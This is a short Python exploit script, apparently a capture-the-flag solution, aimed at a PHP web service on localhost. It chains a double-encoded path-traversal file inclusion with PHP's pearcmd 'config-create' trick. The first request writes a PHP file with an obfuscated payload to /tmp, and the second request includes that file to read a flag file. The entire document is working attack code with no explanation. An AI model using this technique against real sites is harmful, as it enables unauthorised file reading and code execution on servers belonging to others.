import http.client

conn = http.client.HTTPConnection("127.0.0.1", 8091)
conn.request("POST", "/?+config-create+/<?=file_get_contents(chr(47).chr(102).chr(108).chr(97).chr(103))?>+/tmp/probe.php", body="page_id=1&pagename=templates%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fusr%252Flocal%252Flib%252Fphp%252Fpearcmd", headers={"Content-Type": "application/x-www-form-urlencoded"})
conn.getresponse().read()
conn.request("POST", "/", body="page_id=1&pagename=templates%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Ftmp%252Fprobe", headers={"Content-Type": "application/x-www-form-urlencoded"})
print(conn.getresponse().read())
